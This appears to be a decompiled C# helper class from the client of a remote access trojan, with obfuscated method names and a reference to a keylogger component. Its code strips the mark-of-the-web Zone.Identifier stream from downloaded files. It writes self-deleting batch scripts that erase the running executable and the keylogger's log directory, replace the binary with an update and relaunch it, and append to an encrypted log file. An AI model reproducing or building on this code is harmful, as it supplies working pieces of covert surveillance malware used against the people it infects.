using System;
using System.IO;
using System.Text;
using xClient.Core.Utilities;

public static class GClass42
{
	private const string string_0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	private static readonly Random random_0 = new Random(Environment.TickCount);

	public static string smethod_0(int length, string extension = "")
	{
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString() + extension;
	}

	public static string smethod_1(string extension)
	{
		string text;
		do
		{
			text = Path.Combine(Path.GetTempPath(), smethod_0(12, extension));
		}
		while (File.Exists(text));
		return text;
	}

	public static bool smethod_2(byte[] block)
	{
		if (block.Length < 2)
		{
			return false;
		}
		if (block[0] == 77 && block[1] == 90)
		{
			return true;
		}
		if (block[0] == 90)
		{
			return block[1] == 77;
		}
		return false;
	}

	public static bool smethod_3(string filePath)
	{
		return GClass8.DeleteFile(filePath + ":Zone.Identifier");
	}

	public static string smethod_4(bool isFileHidden)
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + GClass53.CurrentPath + "\"\r\nrmdir /q /s \"" + Keylogger.LogDirectory + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string smethod_5(string newFilePath, bool isFileHidden)
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + GClass53.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + GClass53.CurrentPath + "\"\r\nstart \"\" \"" + GClass53.CurrentPath + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string smethod_6()
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + GClass53.CurrentPath + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void smethod_7(string filename, string appendText)
	{
		appendText = smethod_8(filename) + appendText;
		using FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write);
		byte[] array = GClass30.smethod_4(Encoding.UTF8.GetBytes(appendText));
		fileStream.Seek(0L, SeekOrigin.Begin);
		fileStream.Write(array, 0, array.Length);
	}

	public static string smethod_8(string filename)
	{
		if (!File.Exists(filename))
		{
			return string.Empty;
		}
		return Encoding.UTF8.GetString(GClass30.smethod_7(File.ReadAllBytes(filename)));
	}
}
